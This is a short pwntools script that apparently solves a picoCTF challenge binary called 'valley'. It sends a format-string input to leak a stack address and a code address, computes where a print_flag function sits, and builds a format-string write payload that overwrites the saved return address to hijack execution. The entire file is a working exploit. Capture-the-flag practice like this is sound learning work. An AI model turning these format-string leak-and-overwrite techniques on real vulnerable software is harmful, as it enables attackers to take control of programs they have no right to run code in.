from pwn import *

context.binary = elf = ELF("./valley",checksec=False)
p = remote('shape-facility.picoctf.net', 56413)
#p = process("./valley")

p.sendlineafter(b": ", b"%20$p::%21$p")
p.recvuntil(b"distance: ")

address_leak = p.recvline().decode().strip().split("::")

ret = int(address_leak[0], 16) - 8
main = int(address_leak[1], 16)

print_flag = main - 0x1aa

offset = 6
target = ret
value = print_flag

pay = fmtstr_payload(offset,{target:value},write_size='short')
print(len(pay))

p.sendline(pay)
p.sendline(b"exit")

p.interactive()
